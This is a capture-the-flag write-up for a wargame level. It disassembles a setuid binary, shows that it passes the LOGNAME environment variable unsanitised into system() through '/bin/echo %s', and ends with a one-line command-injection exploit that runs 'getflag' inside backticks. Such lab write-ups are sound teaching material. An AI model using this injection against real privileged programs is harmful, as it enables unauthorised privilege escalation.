We get a binary.
Let's run `objdump` and disassaemble the binary:
```
   0x08048514 <+0>: push   ebp
   0x08048515 <+1>: mov    ebp,esp
   0x08048517 <+3>: and    esp,0xfffffff0
   0x0804851a <+6>: sub    esp,0x20
   0x0804851d <+9>: call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:  mov    DWORD PTR [esp+0x18],eax
   0x08048526 <+18>:  call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:  mov    DWORD PTR [esp+0x1c],eax
   0x0804852f <+27>:  mov    eax,DWORD PTR [esp+0x18]
   0x08048533 <+31>:  mov    DWORD PTR [esp+0x8],eax
   0x08048537 <+35>:  mov    eax,DWORD PTR [esp+0x18]
   0x0804853b <+39>:  mov    DWORD PTR [esp+0x4],eax
   0x0804853f <+43>:  mov    eax,DWORD PTR [esp+0x18]
   0x08048543 <+47>:  mov    DWORD PTR [esp],eax
   0x08048546 <+50>:  call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:  mov    eax,DWORD PTR [esp+0x1c]
   0x0804854f <+59>:  mov    DWORD PTR [esp+0x8],eax
   0x08048553 <+63>:  mov    eax,DWORD PTR [esp+0x1c]
   0x08048557 <+67>:  mov    DWORD PTR [esp+0x4],eax
   0x0804855b <+71>:  mov    eax,DWORD PTR [esp+0x1c]
   0x0804855f <+75>:  mov    DWORD PTR [esp],eax
   0x08048562 <+78>:  call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:  mov    DWORD PTR [esp+0x14],0x0
   0x0804856f <+91>:  mov    DWORD PTR [esp],0x8048680
   0x08048576 <+98>:  call   0x8048400 <getenv@plt>
   0x0804857b <+103>: mov    DWORD PTR [esp+0x8],eax
   0x0804857f <+107>: mov    DWORD PTR [esp+0x4],0x8048688
   0x08048587 <+115>: lea    eax,[esp+0x14]
   0x0804858b <+119>: mov    DWORD PTR [esp],eax
   0x0804858e <+122>: call   0x8048440 <asprintf@plt>
   0x08048593 <+127>: mov    eax,DWORD PTR [esp+0x14]
   0x08048597 <+131>: mov    DWORD PTR [esp],eax
   0x0804859a <+134>: call   0x8048410 <system@plt>
   0x0804859f <+139>: leave  
   0x080485a0 <+140>: ret  
```

First interesting lines are these:
```
   0x0804856f <+91>:  mov    DWORD PTR [esp],0x8048680
   0x08048576 <+98>:  call   0x8048400 <getenv@plt>
```
It's `genenv` call with an argument `0x8048680`. By this address there is a string `LOGNAME`.
This means we can pass any string via this environment variable.

Later the variables's value is used to build another string:
```
   0x08048567 <+83>:  mov    DWORD PTR [esp+0x14],0x0
   ...
   0x0804857b <+103>: mov    DWORD PTR [esp+0x8],eax
   0x0804857f <+107>: mov    DWORD PTR [esp+0x4],0x8048688
   0x08048587 <+115>: lea    eax,[esp+0x14]
   0x0804858b <+119>: mov    DWORD PTR [esp],eax
   0x0804858e <+122>: call   0x8048440 <asprintf@plt>
```
This instructions call `asprintf` function with following arguments:
1. `esp+0x14` - a string pointer
2. `esp+0x4` - a string with value `/bin/echo %s`
3. result of `getenv("LOGNAME")`.

After that research, the solution is obvious:
(LOGNAME='`getflag`' && ./level07)
